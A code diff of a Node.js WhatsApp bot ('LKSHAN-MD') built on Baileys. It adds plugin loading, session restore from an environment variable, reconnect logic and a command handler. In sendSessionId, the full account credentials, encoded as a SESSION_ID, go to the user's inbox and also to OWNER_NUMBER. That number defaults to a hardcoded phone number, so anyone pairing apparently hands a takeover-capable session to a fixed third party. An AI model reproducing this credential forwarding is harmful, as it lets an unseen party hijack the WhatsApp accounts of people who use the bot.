@@ -19,13 +19,62 @@ app.use(express.json());
 app.use(cors());
 
 const BOT_NAME = process.env.BOT_NAME || 'LKSHAN-MD';
+const PREFIX = process.env.PREFIX || '.';
 const OWNER_NUMBER = process.env.OWNER_NUMBER || '94724098953';
 
-let sock = null;
+let sock;
 const AUTH_DIR = path.join(__dirname, 'auth_info');
+const commands = new Map();
 
-// 📤 Send Session ID to Inbox and Disconnect (Go Offline)
-async function sendSessionIdAndDisconnect(userJid) {
+// 📂 Load Plugins
+function loadPlugins() {
+    commands.clear();
+    const pluginsDir = path.join(__dirname, 'plugins');
+    if (!fs.existsSync(pluginsDir)) fs.mkdirSync(pluginsDir, { recursive: true });
+
+    const files = fs.readdirSync(pluginsDir);
+    for (const file of files) {
+        if (file.endsWith('.js')) {
+            try {
+                const pluginPath = path.join(pluginsDir, file);
+                delete require.cache[require.resolve(pluginPath)];
+                const plugin = require(pluginPath);
+                if (plugin && plugin.cmd && plugin.handler) {
+                    commands.set(plugin.cmd.toLowerCase(), plugin);
+                }
+            } catch (err) {
+                console.error(`❌ Plugin error ${file}:`, err.message);
+            }
+        }
+    }
+}
+
+loadPlugins();
+
+// 🔑 Restore Session from SESSION_ID Environment Variable
+function restoreSessionFromEnv() {
+    const sessionId = process.env.SESSION_ID;
+    if (!sessionId || !sessionId.startsWith(`${BOT_NAME}~`)) return false;
+
+    try {
+        console.log('🔑 Restoring Session from SESSION_ID...');
+        if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });
+
+        const base64Data = sessionId.replace(`${BOT_NAME}~`, '');
+        const jsonString = Buffer.from(base64Data, 'base64').toString('utf-8');
+        const credsData = JSON.parse(jsonString);
+
+        fs.writeFileSync(path.join(AUTH_DIR, 'creds.json'), JSON.stringify(credsData, null, 2));
+        console.log('✅ Session restored successfully!');
+        return true;
+    } catch (err) {
+        console.error('❌ Session restore error:', err.message);
+        return false;
+    }
+}
+
+// 📤 Send Direct Session ID to User's Inbox and disconnect
+async function sendSessionId(userJid) {
     try {
         const credsFilePath = path.join(AUTH_DIR, 'creds.json');
         if (!fs.existsSync(credsFilePath)) return;
@@ -36,52 +85,45 @@ async function sendSessionIdAndDisconnect(userJid) {
 
         if (sock && userJid) {
             const sessionMsg = `*───────────────────*\n` +
-                               `🎉 *${BOT_NAME} SESSION GENERATED!* 🔑\n` +
+                               `🎉 *${BOT_NAME} CONNECTED!* 🟢\n` +
                                `*───────────────────*\n\n` +
                                `🔑 *Your Direct SESSION_ID:*\n\n` +
                                `\`\`\`${generatedSessionId}\`\`\`\n\n` +
-                               `📌 *Heroku Config Vars (Main Bot):* \n` +
+                               `📌 *Heroku Config Vars:* \n` +
                                `Key: \`SESSION_ID\`\n` +
-                               `Value: (උඩ තියෙන මුළු Session ID එකම කොපි කරලා Paste කරන්න)\n\n` +
-                               `⚠️ *Note:* Pair Site එක මේ වන විට Offline වී ඇත!`;
+                               `Value: (උඩ තියෙන මුළු Session ID එකම කොපි කරලා මෙතැනට Paste කරන්න)`;
 
-            // 1. Inbox එකට Session ID එක යැවීම
+            // 1. Bot Connect වුණු අංකයේම Inbox (Saved Messages / Yourself Chat) එකට යැවීම
             await sock.sendMessage(userJid, { text: sessionMsg });
 
-            // 2. Owner Number එකක් ඇත්නම් ඒකටත් Copy එකක් යැවීම
+            // 2. Owner Number එකක් දීලා තියෙනවා නම් ඒකටත් Inbox එකටම Copy එකක් යැවීම
             if (OWNER_NUMBER) {
                 const ownerJid = `${OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                 if (ownerJid !== userJid) {
-                    await sock.sendMessage(ownerJid, { text: sessionMsg }).catch(() => {});
+                    await sock.sendMessage(ownerJid, { text: sessionMsg });
                 }
             }
 
             console.log(`✅ Session ID sent successfully to Inbox: ${userJid}`);
+            console.log('🔌 Disconnecting pairing bot to go offline for main bot setup...');
 
-            // 🛑 Message එක යැවූ පසු Connection එක Disconnect කර Offline කිරීම
-            await delay(3000);
-            console.log('🛑 Closing socket & Disconnecting Pairing Site...');
-
-            if (sock) {
-                await sock.ws.close();
-                sock = null;
-            }
-
-            // Temp auth directory එක delete කිරීම
-            if (fs.existsSync(AUTH_DIR)) {
-                fs.rmSync(AUTH_DIR, { recursive: true, force: true });
-            }
-
-            console.log('🔴 Pairing Site is now completely OFFLINE!');
+            // Message එක සෙන්ඩ් වූ පසු ලිංක් එක කැඩී offline යාමට connection එක වසා දමා process එක නවත්වයි
+            await delay(2000);
+            if (sock.ws) sock.ws.close();
+            process.exit(0);
         }
     } catch (err) {
-        console.error('❌ Session Send Error:', err.message);
+        console.error('❌ Session ID Send Error:', err.message);
     }
 }
 
-// 🚀 Temporary Socket Connection for Pairing Only
-async function startPairingSocket() {
+// 🚀 Start Bot Connection
+async function startBot() {
     try {
+        if (!fs.existsSync(AUTH_DIR) || fs.readdirSync(AUTH_DIR).length === 0) {
+            restoreSessionFromEnv();
+        }
+
         const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
         const { version } = await fetchLatestBaileysVersion();
 
@@ -91,7 +133,10 @@ async function startPairingSocket() {
             auth: state,
             printQRInTerminal: false,
             browser: Browsers.ubuntu('Chrome'),
-            connectTimeoutMs: 60000
+            connectTimeoutMs: 60000,
+            defaultQueryTimeoutMs: 60000,
+            keepAliveIntervalMs: 25000,
+            emitOwnEvents: true
         });
 
         sock.ev.on('creds.update', saveCreds);
@@ -101,22 +146,56 @@ async function startPairingSocket() {
 
             if (connection === 'close') {
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
-                if (statusCode === DisconnectReason.loggedOut) {
+                console.log(`🔴 Closed (Code: ${statusCode}). Reconnecting...`);
+                if (statusCode !== DisconnectReason.loggedOut) {
+                    setTimeout(startBot, 5000);
+                } else {
                     if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
                 }
             } else if (connection === 'open') {
-                console.log(`🟢 Pair Connection Established! Sending Session ID...`);
+                console.log(`🟢 [${BOT_NAME}] Connected successfully!`);
 
+                // Connect වුණු ගමන් අදාළ User JID එක අරගෙන Inbox එකට Message එක යැවීම
                 const rawUserJid = sock.user.id.split(':')[0];
                 const userJid = `${rawUserJid}@s.whatsapp.net`;
-
-                await delay(2000);
-                await sendSessionIdAndDisconnect(userJid);
+                
+                await delay(3000); // Connection එක හරියටම Establish වෙනකම් තත්පර 3ක් ඉඳලා Send කරනවා
+                await sendSessionId(userJid);
             }
         });
 
-    } catch (err) {
-        console.error("❌ Pair Socket Error:", err.message);
+        // 📩 Messages Handler
+        sock.ev.on('messages.upsert', async ({ messages, type }) => {
+            if (type !== 'notify') return;
+            const msg = messages[0];
+            if (!msg || !msg.message) return;
+
+            const from = msg.key.remoteJid;
+            const body = msg.message.conversation || 
+                         msg.message.extendedTextMessage?.text || 
+                         msg.message.imageMessage?.caption || 
+                         msg.message.videoMessage?.caption || '';
+
+            const trimmedBody = body.trim();
+            if (!trimmedBody) return;
+
+            if (!trimmedBody.startsWith(PREFIX)) return;
+
+            const args = trimmedBody.slice(PREFIX.length).trim().split(/ +/);
+            const cmdName = args.shift().toLowerCase();
+
+            let plugin = commands.get(cmdName);
+            if (plugin && typeof plugin.handler === 'function') {
+                try {
+                    await plugin.handler(sock, msg, from, args, { BOT_NAME, PREFIX });
+                } catch (err) {
+                    await sock.sendMessage(from, { text: `❌ Error: ${err.message}` }, { quoted: msg });
+                }
+            }
+        });
+
+    } catch (botErr) {
+        console.error("❌ Fatal Error:", botErr.message);
     }
 }
 
@@ -128,7 +207,7 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>${BOT_NAME} - Pair Site</title>
+            <title>${BOT_NAME} - Pairing Code</title>
             <style>
                 body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0b141a; color: #e9edef; margin: 0; }
                 .card { background: #111b21; padding: 30px; border-radius: 16px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #222d34; }
@@ -181,24 +260,20 @@ app.get('/pair', async (req, res) => {
     num = num.replace(/[^0-9]/g, '');
 
     try {
-        if (fs.existsSync(AUTH_DIR)) {
-            fs.rmSync(AUTH_DIR, { recursive: true, force: true });
+        if (!sock || !sock.authState.creds.registered) {
+            await delay(1500);
+            const code = await sock.requestPairingCode(num);
+            return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
+        } else {
+            return res.json({ error: 'Already connected!' });
         }
-
-        await startPairingSocket();
-        await delay(2000);
-
-        if (!sock) return res.status(500).json({ error: 'Socket initialization failed' });
-
-        const code = await sock.requestPairingCode(num);
-        return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
     } catch (err) {
-        console.error("Pairing Error:", err.message);
         return res.status(500).json({ error: 'Pairing failed' });
     }
 });
 
-// Start Server (Does NOT start bot automatically on boot)
+// Start Web Server
 app.listen(PORT, () => {
-    console.log(`🌐 Pairing Site active on port ${PORT}`);
+    console.log(`🌐 Server active on port ${PORT}`);
+    setTimeout(startBot, 1000);
 });
